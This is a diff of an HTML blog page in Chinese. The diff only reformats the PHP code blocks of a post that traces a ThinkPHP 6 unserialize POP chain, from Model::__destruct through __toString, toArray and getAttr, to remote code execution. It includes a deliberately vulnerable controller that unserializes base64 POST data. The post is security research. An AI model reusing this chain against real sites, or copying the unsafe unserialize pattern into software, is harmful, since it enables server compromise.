@@ -392,50 +392,280 @@
 <a id="more"></a>
 
 <p>修改index页面如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">poc</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> base64_decode($_POST[<span class="string">'payload'</span>]);</span><br><span class="line">        unserialize(base64_decode($_POST[<span class="string">'payload'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace app\controller;
+use app\BaseController;
 
+class Index extends BaseController
+{
+    public function poc()
+    {
+        echo base64_decode($_POST[&#39;payload&#39;]);
+        unserialize(base64_decode($_POST[&#39;payload&#39;]));
+    }
+}</code></pre>
 <h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><p>全局搜索<code>__destruct</code>，找到Model模块的，满足<code>$this-&gt;lazySave == true</code>条件，进入代码[1]</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;save(); <span class="comment">// 1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">// vendor/topthink/think-orm/src/Model.php
 
+public function __destruct()
+{
+    if ($this-&gt;lazySave) {
+        $this-&gt;save(); // 1
+    }
+}</code></pre>
 <p>跟进<code>$this-&gt;save()</code>，满足<code>$this-&gt;isEmpty() == false &amp;&amp; $this-&gt;trigger(&#39;BeforeWrite&#39;) == true &amp;&amp; $this-&gt;exists == true</code>条件，其中<code>isEmpty</code>判断的是<code>data</code>是否为空，<code>trigger</code>函数满足<code>$this-&gt;withEvent == false</code>即可，接着可以进入代码[2]</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $data = [], string $sequence = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence); <span class="comment">// 2</span></span><br><span class="line">    </span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">// vendor/topthink/think-orm/src/Model.php
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+public function save(array $data = [], string $sequence = null): bool
+{
+    ...
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/ModelEvent.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(string $event)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#39;BeforeWrite&#39;)) {
+        return false;
+    }
 
+    $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); // 2
+
+    ...
+}</code></pre>
+<pre><code class="php">// vendor/topthink/think-orm/src/Model.php
+
+public function isEmpty(): bool
+{
+    return empty($this-&gt;data);
+}</code></pre>
+<pre><code class="php">// vendor/topthink/think-orm/src/model/concern/ModelEvent.php
+
+protected function trigger(string $event): bool
+{
+    if (!$this-&gt;withEvent) {
+        return true;
+    }
+
+    ...
+}</code></pre>
 <p>跟进<code>$this-&gt;updateData()</code>，满足<code>$this-&gt;trigger(&#39;BeforeWrite&#39;) == true</code>条件，进入代码[3]</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 事件回调</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeUpdate'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">$this</span>-&gt;checkData();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取有更新的数据</span></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;getChangedData(); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">        <span class="comment">// 关联更新</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autoRelationUpdate();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="keyword">$this</span>-&gt;updateTime &amp;&amp; !<span class="keyword">isset</span>($data[<span class="keyword">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">        <span class="comment">// 自动写入更新时间</span></span><br><span class="line">        $data[<span class="keyword">$this</span>-&gt;updateTime]       = <span class="keyword">$this</span>-&gt;autoWriteTimestamp(<span class="keyword">$this</span>-&gt;updateTime);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;updateTime] = $data[<span class="keyword">$this</span>-&gt;updateTime];</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="comment">// 检查允许字段</span></span><br><span class="line">    $allowFields = <span class="keyword">$this</span>-&gt;checkAllowFields(); <span class="comment">// 4</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">// vendor/topthink/think-orm/src/Model.php
 
+protected function updateData(): bool
+{
+    // 事件回调
+    if (false === $this-&gt;trigger(&#39;BeforeUpdate&#39;)) {
+        return false;
+    }
+
+    $this-&gt;checkData();
+
+    // 获取有更新的数据
+    $data = $this-&gt;getChangedData(); // 3
+
+    if (empty($data)) {
+        // 关联更新
+        if (!empty($this-&gt;relationWrite)) {
+            $this-&gt;autoRelationUpdate();
+        }
+
+        return true;
+    }
+
+    if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime])) {
+        // 自动写入更新时间
+        $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp($this-&gt;updateTime);
+        $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];
+    }
+
+    // 检查允许字段
+    $allowFields = $this-&gt;checkAllowFields(); // 4
+    ...
+}</code></pre>
 <p>跟进<code>$this-&gt;getChangedData()</code>，这里应该使<code>$this-&gt;force == true</code>，直接返回$data，否则会返回其他干扰值</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Attribute.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;force ? <span class="keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> <span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">empty</span>($a) || <span class="keyword">empty</span>($b)) &amp;&amp; $a !== $b) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> is_object($a) || $a != $b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Attribute.php
 
+public function getChangedData(): array
+{
+    $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) {
+        if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) {
+            return 1;
+        }
+
+        return is_object($a) || $a != $b ? 1 : 0;
+    });
+
+    ...
+
+    return $data;
+}</code></pre>
 <p>回到上一步，满足<code>empty($data) == false</code>条件进入代码[4]，跟进<code>$this-&gt;checkAllowFields()</code>，满足<code>empty($this-&gt;field) == true &amp;&amp; empty($this-&gt;schema) == true</code>条件，进入代码[5]</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测字段</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $query = <span class="keyword">$this</span>-&gt;db(); <span class="comment">// 5</span></span><br><span class="line">            $table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">// vendor/topthink/think-orm/src/Model.php
 
+protected function checkAllowFields(): array
+{
+    // 检测字段
+    if (empty($this-&gt;field)) {
+        if (!empty($this-&gt;schema)) {
+            $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType));
+        } else {
+            $query = $this-&gt;db(); // 5
+            $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable();
+
+            $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);
+        }
+
+        return $this-&gt;field;
+    }
+
+    ...
+}</code></pre>
 <p>跟进<code>$this-&gt;db()</code>，代码[6]处参数可控，可以触发<code>__toString()</code>函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span><span class="params">($scope = [])</span>: <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">    $query = <span class="keyword">self</span>::$db-&gt;connect(<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">        -&gt;name(<span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;suffix) <span class="comment">// 6</span></span><br><span class="line">        -&gt;pk(<span class="keyword">$this</span>-&gt;pk);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">// vendor/topthink/think-orm/src/Model.php
 
+public function db($scope = []): Query
+{
+    /** @var Query $query */
+    $query = self::$db-&gt;connect($this-&gt;connection)
+        -&gt;name($this-&gt;name . $this-&gt;suffix) // 6
+        -&gt;pk($this-&gt;pk);
+
+    ...
+}</code></pre>
 <blockquote>
 <p>后面POP链与ThinkPHP5.1相同</p>
 </blockquote>
 <p>首先触发Conversion类中的<code>__toString()</code>方法</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Conversion.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">(int $options = JSON_UNESCAPED_UNICODE)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options); <span class="comment">// 8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson(); <span class="comment">// 7</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Conversion.php
 
+public function toJson(int $options = JSON_UNESCAPED_UNICODE): string
+{
+    return json_encode($this-&gt;toArray(), $options); // 8
+}
+
+public function __toString()
+{
+    return $this-&gt;toJson(); // 7
+}</code></pre>
 <p>跟进到<code>$this-&gt;toArray()</code>，最后我们的目标是调用<code>getAttr()</code>函数，但是代码[9]处的条件会被前面的代码修改，不可控，所以我们只能利用代码[10]</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Conversion.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;visible <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_string($val)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (strpos($val, <span class="string">'.'</span>)) &#123;</span><br><span class="line">                    [$relation, $name]          = explode(<span class="string">'.'</span>, $val);</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;visible[$relation][] = $name;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;visible[$val] = <span class="keyword">true</span>;</span><br><span class="line">                    $hasVisible          = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">            <span class="comment">// 关联模型对象</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">                $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">                $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 关联模型对象</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) || <span class="keyword">true</span> !== <span class="keyword">$this</span>-&gt;hidden[$key]) &#123;</span><br><span class="line">                $item[$key] = $val-&gt;toArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">            $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key); <span class="comment">// 9</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">            $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key); <span class="comment">// 10</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Conversion.php
 
+public function toArray(): array
+{
+    ...
+
+    foreach ($this-&gt;visible as $key =&gt; $val) {
+            if (is_string($val)) {
+                if (strpos($val, &#39;.&#39;)) {
+                    [$relation, $name]          = explode(&#39;.&#39;, $val);
+                    $this-&gt;visible[$relation][] = $name;
+                } else {
+                    $this-&gt;visible[$val] = true;
+                    $hasVisible          = true;
+                }
+                unset($this-&gt;visible[$key]);
+            }
+        }
+
+    ...
+
+    foreach ($data as $key =&gt; $val) {
+        if ($val instanceof Model || $val instanceof ModelCollection) {
+            // 关联模型对象
+            if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) {
+                $val-&gt;visible($this-&gt;visible[$key]);
+            } elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) {
+                $val-&gt;hidden($this-&gt;hidden[$key]);
+            }
+            // 关联模型对象
+            if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) {
+                $item[$key] = $val-&gt;toArray();
+            }
+        } elseif (isset($this-&gt;visible[$key])) {
+            $item[$key] = $this-&gt;getAttr($key); // 9
+        } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) {
+            $item[$key] = $this-&gt;getAttr($key); // 10
+        }
+    }
+
+    ...
+}</code></pre>
 <p>跟进<code>$this-&gt;getAttr($key)</code>，我们可以在代码[11]插入任意命令</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Attribute.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $relation = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name); <span class="comment">// 11</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $relation = <span class="keyword">$this</span>-&gt;isRelationAttr($name);</span><br><span class="line">        $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation); <span class="comment">// 13</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Attribute.php
 
+public function getAttr(string $name)
+{
+    try {
+        $relation = false;
+        $value    = $this-&gt;getData($name); // 11
+    } catch (InvalidArgumentException $e) {
+        $relation = $this-&gt;isRelationAttr($name);
+        $value    = null;
+    }
+
+    return $this-&gt;getValue($name, $value, $relation); // 13
+}</code></pre>
 <p>继续跟进<code>$this-&gt;getData($name)</code>，代码[12]那里我们要返回存储在<code>data</code>的命令参数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Attribute.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName]; <span class="comment">// 12</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$fieldName];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Attribute.php
 
+public function getData(string $name = null)
+{
+    if (is_null($name)) {
+        return $this-&gt;data;
+    }
+
+    $fieldName = $this-&gt;getRealFieldName($name);
+
+    if (array_key_exists($fieldName, $this-&gt;data)) {
+        return $this-&gt;data[$fieldName]; // 12
+    } elseif (array_key_exists($fieldName, $this-&gt;relation)) {
+        return $this-&gt;relation[$fieldName];
+    }
+
+    throw new InvalidArgumentException(&#39;property not exists:&#39; . static::class . &#39;-&gt;&#39; . $name);
+}</code></pre>
 <p>返回上一步继续跟进<code>$this-&gt;getValue($name, $value, $relation)</code>，在这里把代码[14]把存储在<code>withAttr</code>的命令参数赋值给<code>closure</code>，代码[15]即可进行RCE</p>
